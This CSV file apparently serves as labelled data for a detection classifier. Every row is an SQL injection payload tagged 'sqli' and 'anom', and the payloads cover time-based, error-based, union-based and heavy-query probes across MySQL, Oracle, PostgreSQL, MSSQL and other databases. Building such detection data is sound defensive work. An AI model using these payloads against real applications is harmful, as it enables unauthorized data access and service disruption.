"payload","length","attack_type","label"
"1))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((9474=9474","112","sqli","anom"
"1' and sleep(5)","15","sqli","anom"
"1%');waitfor delay '0:0:5' and ('%'='","37","sqli","anom"
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('qvoy'='qvoy","111","sqli","anom"
"1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (3945=3945","111","sqli","anom"
"1"" where 4445=4445 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--","110","sqli","anom"
"1%'))) union all select null,null,null#","39","sqli","anom"
"-4582)) as gvfo where 8885=8885 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","264","sqli","anom"
"-3880) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (5194=5194","252","sqli","anom"
"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","95","sqli","anom"
"1')) union all select null,null,null,null,null,null,null,null,null,null--","73","sqli","anom"
"1 and (select * from (select(sleep(5)))fzno)","44","sqli","anom"
"1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#","78","sqli","anom"
"1"" where 8483=8483 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","160","sqli","anom"
"-1451%') union all select 7666,7666,7666#","41","sqli","anom"
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""ccuy""=""ccuy","118","sqli","anom"
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","107","sqli","anom"
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('bgdp'='bgdp","179","sqli","anom"
"-3062')) or 6872=6872 and (('uzth' like 'uzth","45","sqli","anom"
"1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# couj","163","sqli","anom"
"1""));(select * from (select(sleep(5)))srmq) and ((""xeki"" like ""xeki","67","sqli","anom"
"1%"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""","109","sqli","anom"
"1))) and (select * from (select(sleep(5)))gcrr)#","48","sqli","anom"
"-4592"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""xvpz""=""xvpz","225","sqli","anom"
"-3998')) or 3038=3038","21","sqli","anom"
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)","204","sqli","anom"
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)","95","sqli","anom"
"-1830"")) as bptv where 4805=4805 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","265","sqli","anom"
"1)) as acni where 6355=6355 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","126","sqli","anom"
"1%') or sleep(5) and ('%'='","27","sqli","anom"
"1)) as shmg where 1371=1371 union all select null,null,null,null,null,null,null,null,null,null#","95","sqli","anom"
"-6145 or (8459=8459)*4906-- yklv","32","sqli","anom"
"1') as uvxl where 6211=6211 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--","159","sqli","anom"
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('lshk' like 'lshk","167","sqli","anom"
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--","89","sqli","anom"
"1"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","112","sqli","anom"
"-3431%') or 9323=9323#","22","sqli","anom"
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""oyxk""=""oyxk","195","sqli","anom"
"1%')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","112","sqli","anom"
"1%')) rlike (select * from (select(sleep(5)))vwyq)#","51","sqli","anom"
"1'));select sleep(5) and (('ilcv'='ilcv","39","sqli","anom"
"-4615'))) or elt(1032=1032,3623) and ((('jipk' like 'jipk","57","sqli","anom"
"1'+(select 'ovti' where 4243=4243 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'","111","sqli","anom"
"-8131')) or 9680=3467","21","sqli","anom"
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","159","sqli","anom"
"1"")) and make_set(8403=8403,8899) and ((""ieuj"" like ""ieuj","57","sqli","anom"
"1') where 7252=7252;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","110","sqli","anom"
"-7078'||(select 'lcza' where 5076=5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--","107","sqli","anom"
"1"");select count(*) from generate_series(1,5000000) and (""jzmg""=""jzmg","69","sqli","anom"
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3","84","sqli","anom"
"-8684' where 9820=9820 or 6844=5105","35","sqli","anom"
"1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- xwoo","240","sqli","anom"
"1'+(select 'sacd' where 5984=5984 union all select null,null,null,null,null,null,null#","86","sqli","anom"
"1"")) as wooq where 7671=7671 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--","232","sqli","anom"
"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","119","sqli","anom"
"1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'","244","sqli","anom"
"1'||(select 'gdzt' where 4950=4950;select sleep(5)#","51","sqli","anom"
"-4932%"")) or (3076=5927)*5927 and ((""%""=""","41","sqli","anom"
"-5657'))) union all select 8071,8071,8071,8071,8071,8071,8071,8071#","67","sqli","anom"
"1' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","78","sqli","anom"
"1';waitfor delay '0:0:5' and 'gsvt'='gsvt","41","sqli","anom"
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)","116","sqli","anom"
"1') and 2006=2006","17","sqli","anom"
"1';waitfor delay '0:0:5' and 'fjpf' like 'fjpf","46","sqli","anom"
"1' where 2373=2373 union all select null,null#","46","sqli","anom"
"1'+(select 'sbvh' where 8539=8539 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'","137","sqli","anom"
"-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--","74","sqli","anom"
"1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--","69","sqli","anom"
"-9697) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--","70","sqli","anom"
"1%'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='","189","sqli","anom"
"1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","97","sqli","anom"
"1'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","68","sqli","anom"
"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='","59","sqli","anom"
"1"" or (select * from (select(sleep(5)))sddo)#","45","sqli","anom"
"-7238%' or make_set(5375=9563,9563) and '%'='","45","sqli","anom"
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""","60","sqli","anom"
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)# vojr","208","sqli","anom"
"1"")) as jsdc where 2748=2748;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","126","sqli","anom"
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu","217","sqli","anom"
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- lxey","101","sqli","anom"
"-9389') order by 1#","19","sqli","anom"
"1'||(select 'iocs' where 9287=9287 and 8407=(select count(*) from generate_series(1,5000000)))||'","97","sqli","anom"
"-6626%"") or 1744=5292 and (""%""=""","32","sqli","anom"
"1));select count(*) from generate_series(1,5000000) and ((7240=7240","67","sqli","anom"
"-2181') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('wyez'='wyez","211","sqli","anom"
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr","107","sqli","anom"
"1') and 6969=(select 6969 from pg_sleep(5)) and ('ifvz' like 'ifvz","66","sqli","anom"
"1%';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","97","sqli","anom"
"1%""))) and (3020=3020)*6703 and (((""%""=""","40","sqli","anom"
"-2373%"") or 9323=9323#","22","sqli","anom"
"1%');iif(9134=5736,1,1/0)","25","sqli","anom"
"1)) as huxq where 7451=7451 union all select null,null,null--","61","sqli","anom"
"-2226%"")) union all select 1018,1018,1018,1018--","48","sqli","anom"
"1"") where 3084=3084 union all select null,null--","48","sqli","anom"
"1%');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","89","sqli","anom"
"1) as zqxa where 5718=5718 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","122","sqli","anom"
"1""))) or 4240=(select 4240 from pg_sleep(5))--","46","sqli","anom"
"-7633') as aslj where 2317=2317 or 8571=8571--","46","sqli","anom"
"-9684"" order by 1#","18","sqli","anom"
"-6632) union all select 4073,4073,4073,4073,4073,4073,4073,4073--","65","sqli","anom"
"1 or (select * from (select(sleep(5)))ydpu)","43","sqli","anom"
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","108","sqli","anom"
"-2840'))) union all select 3025,3025,3025,3025--","48","sqli","anom"
"1"" and sleep(5)","15","sqli","anom"
"-6158""))) or 8571=8571--","24","sqli","anom"
"-6593"") union all select 6216,6216,6216,6216,6216,6216,6216#","60","sqli","anom"
"1')) as yefv where 4263=4263;waitfor delay '0:0:5'--","52","sqli","anom"
"1') where 4509=4509 union all select null--","43","sqli","anom"
"1"" where 8978=8978 union all select null,null,null,null,null,null,null,null--","77","sqli","anom"
"1) as rtpl where 1262=1262 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--","89","sqli","anom"
"1') where 2852=2852;select case when 7717=7717 then 1 else null end--","69","sqli","anom"
"-3378%"")) union all select 9357,9357,9357,9357,9357--","53","sqli","anom"
"1))) and 3824=benchmark(5000000,md5(0x76555642)) and (((6556=6556","65","sqli","anom"
"-6186' in boolean mode) union all select 2990,2990,2990#","56","sqli","anom"
"1"")) rlike sleep(5) and ((""ahhx"" like ""ahhx","43","sqli","anom"
"-1597"" where 5933=5933 or 3038=3038","35","sqli","anom"
"1) as ptxw where 9873=9873;begin dbms_lock.sleep(5); end--","58","sqli","anom"
"1) where 4698=4698 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","114","sqli","anom"
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""ygzq"" like ""ygzq","116","sqli","anom"
"1 rlike (select (case when (6795=5898) then 1 else 0x28 end))-- xdkx","68","sqli","anom"
"-2798'+(select 'emui' where 9565=9565 union all select 9565,9565,9565,9565--","76","sqli","anom"
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""rfpq""=""rfpq","111","sqli","anom"
"1'))) and (select * from (select(sleep(5)))fzno) and ((('yctp'='yctp","68","sqli","anom"
"1') and (select * from (select(sleep(5)))fzno) and ('eqfh'='eqfh","64","sqli","anom"
"1"" where 7788=7788 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","170","sqli","anom"
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xdce'='xdce","81","sqli","anom"
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--","83","sqli","anom"
"-2256""))) or 1971=4537#","23","sqli","anom"
"1"") where 9093=9093;call regexp_substring(repeat(right(char(2385),0),500000000),null)--","87","sqli","anom"
"-2394') union all select 1650,1650,1650,1650,1650,1650,1650--","61","sqli","anom"
"-2375 union all select 1573,1573,1573,1573#","43","sqli","anom"
"1') as ybuv where 9641=9641 union all select null,null,null,null,null,null,null,null--","86","sqli","anom"
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3","93","sqli","anom"
"1' and make_set(2942=8200,8200) and 'jnhv' like 'jnhv","53","sqli","anom"
"1%""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""%""=""","110","sqli","anom"
"1"") where 8196=8196;iif(2840=3788,1,1/0)","40","sqli","anom"
"-7382')) or make_set(9425=4330,4330) and (('tvaz' like 'tvaz","60","sqli","anom"
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))","198","sqli","anom"
"1')) union all select null,null--","33","sqli","anom"
"-9315'))) union all select 5057,5057,5057,5057,5057#","52","sqli","anom"
"1"") as eaxo where 2728=2728;waitfor delay '0:0:5'--","51","sqli","anom"
"-3597')) order by 1--","21","sqli","anom"
"1') as ftyp where 5851=5851 or 4240=(select 4240 from pg_sleep(5))--","68","sqli","anom"
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)","106","sqli","anom"
"1,(case when 8260=8260 then 1 else null end)","44","sqli","anom"
"-1634%' union all select 5937,5937,5937,5937--","46","sqli","anom"
"1');select count(*) from generate_series(1,5000000) and ('cewn'='cewn","69","sqli","anom"
"1) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (3872=3872","218","sqli","anom"
"-1985))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((1248=1248","256","sqli","anom"
"1"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""dtfg""=""dtfg","194","sqli","anom"
"1"")) as dpln where 4193=4193 rlike sleep(5)--","45","sqli","anom"
"1')) and (3020=3020)*6703 and (('mgfd'='mgfd","44","sqli","anom"
"1""))) and make_set(8403=8403,8899) and (((""czvm"" like ""czvm","59","sqli","anom"
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""xyjg""=""xyjg","251","sqli","anom"
"(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","96","sqli","anom"
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""%""=""","100","sqli","anom"
"1)) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((2939=2939","80","sqli","anom"
"1""))) order by 1--","18","sqli","anom"
"-9758'+(select 'rlcy' where 3691=3691 union all select 3691,3691,3691,3691,3691,3691,3691--","91","sqli","anom"
"-9629'))) union all select 3077,3077,3077,3077#","47","sqli","anom"
"1))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","142","sqli","anom"
"1%"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","101","sqli","anom"
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('xfmq'='xfmq","118","sqli","anom"
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rnyb'='rnyb","209","sqli","anom"
"1);begin dbms_lock.sleep(5); end and (9416=9416","47","sqli","anom"
"1')));begin user_lock.sleep(5); end--","37","sqli","anom"
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)# fzni","98","sqli","anom"
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""lsca"" like ""lsca","134","sqli","anom"
"1) as pyjx where 9005=9005;select benchmark(5000000,md5(0x714e4153))#","69","sqli","anom"
"1) as jqbp where 5407=5407 and 4595=4595#","41","sqli","anom"
"-4145%"")) union all select 9404,9404,9404,9404,9404,9404,9404#","62","sqli","anom"
"1"") where 8657=8657;select benchmark(5000000,md5(0x714e4153))#","62","sqli","anom"
"1'));select * from generate_series(7407,7407,case when (7407=6562) then 1 else 0 end) limit 1--","95","sqli","anom"
"-1337"") union all select 7508--","31","sqli","anom"
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'='","108","sqli","anom"
"1)) as oywa where 7951=7951 union all select null,null,null,null,null,null#","75","sqli","anom"
"1""))) union all select null,null#","33","sqli","anom"
"1""));begin dbms_lock.sleep(5); end and ((""rqay"" like ""rqay","58","sqli","anom"
"1"" where 7015=7015 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--","150","sqli","anom"
"-9098' union all select 3476,3476,3476,3476,3476,3476#","54","sqli","anom"
"-4736')) or elt(5835=5509,5509) and (('iawg'='iawg","50","sqli","anom"
"-9171) union all select 6880,6880,6880,6880,6880,6880,6880#","59","sqli","anom"
"1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')","97","sqli","anom"
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","103","sqli","anom"
"1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","118","sqli","anom"
"1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--","59","sqli","anom"
"1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('gsjp'='gsjp","85","sqli","anom"
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341","49","sqli","anom"
"1) where 5232=5232 union all select null,null,null#","51","sqli","anom"
"-3436) or 9281=3172","19","sqli","anom"
"-9558""))) union all select 2935,2935,2935,2935,2935--","53","sqli","anom"
"-2140)) union all select 8174,8174,8174#","40","sqli","anom"
"1) and 9198=9198--","18","sqli","anom"
"(select (case when (3592=3592) then 3592 else 3592*(select 3592 from information_schema.character_sets) end))","109","sqli","anom"
"1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#","201","sqli","anom"
"1'||(select 'byxb' where 8351=8351 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))||'","225","sqli","anom"
"-5268') where 5615=5615 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--","205","sqli","anom"
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","141","sqli","anom"
"1') where 7646=7646 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","115","sqli","anom"
"1') where 2928=2928 and (select * from (select(sleep(5)))gcrr)#","63","sqli","anom"
"1"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""rkvr""=""rkvr","81","sqli","anom"
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))# mpyu","110","sqli","anom"
"1 union all select null,null,null,null,null,null,null--","55","sqli","anom"
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""regi"" like ""regi","194","sqli","anom"
"1') where 8707=8707 and 3210=1477--","35","sqli","anom"
"1%"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""%""=""","119","sqli","anom"
"1"")));select (case when (9434=2780) then 9434 else 9434*(select 9434 from information_schema.character_sets) end)#","114","sqli","anom"
"1)));iif(9190=5059,1,1/0)","25","sqli","anom"
"1'));begin dbms_lock.sleep(5); end--","36","sqli","anom"
"-7945%'))) union all select 4286,4286,4286,4286,4286,4286--","59","sqli","anom"
"-9311)) or (5065=2572)*2572 and ((1199=1199","43","sqli","anom"
"1'+(select somn where 8636=8636 rlike sleep(5))+'","49","sqli","anom"
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'gzlz' like 'gzlz","118","sqli","anom"
"1 where 3535=3535 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","113","sqli","anom"
"-4583') as evbo where 6055=6055 union all select 6055--","55","sqli","anom"
"1') as kbja where 4275=4275 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","185","sqli","anom"
"-8490)) union all select 6910,6910,6910,6910,6910,6910#","55","sqli","anom"
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""%""=""","130","sqli","anom"
"-8369) where 7234=7234 order by 1--","35","sqli","anom"
"1) as qodq where 4945=4945 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","121","sqli","anom"
"1';iif(9007=3836,1,1/0)","23","sqli","anom"
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","120","sqli","anom"
"1"")) union all select null,null,null,null#","42","sqli","anom"
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""gcyp"" like ""gcyp","118","sqli","anom"
"1"");select benchmark(5000000,md5(0x4c4d6142)) and (""hgds"" like ""hgds","68","sqli","anom"
"1%')) union all select null,null,null,null,null,null,null,null#","63","sqli","anom"
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('ufbr'='ufbr","89","sqli","anom"
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)","189","sqli","anom"
"1 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","139","sqli","anom"
"1') as pkis where 3446=3446 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","103","sqli","anom"
"1%"");(select * from (select(sleep(5)))srmq) and (""%""=""","54","sqli","anom"
"1"") where 2656=2656 or sleep(5)--","33","sqli","anom"
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","119","sqli","anom"
"1%"";select (case when (8350=7872) then 8350 else 8350*(select 8350 from information_schema.character_sets) end)#","112","sqli","anom"
"-3321"" where 1603=1603 union all select 1603,1603,1603,1603#","60","sqli","anom"
"1) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","110","sqli","anom"
"1')) as namw where 1740=1740 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","121","sqli","anom"
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""","187","sqli","anom"
"1"") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--","113","sqli","anom"
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu","119","sqli","anom"
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""rvuz"" like ""rvuz","131","sqli","anom"
"-9145') as xyya where 8950=8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--","90","sqli","anom"
"1'||(select 'znba' where 8323=8323;select pg_sleep(5)--","55","sqli","anom"
"1'+(select syrz where 7699=7699 union all select null,null,null#","64","sqli","anom"
"-6220' union all select 1462,1462#","34","sqli","anom"
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""=""","108","sqli","anom"
"-1304') union all select 7639#","30","sqli","anom"
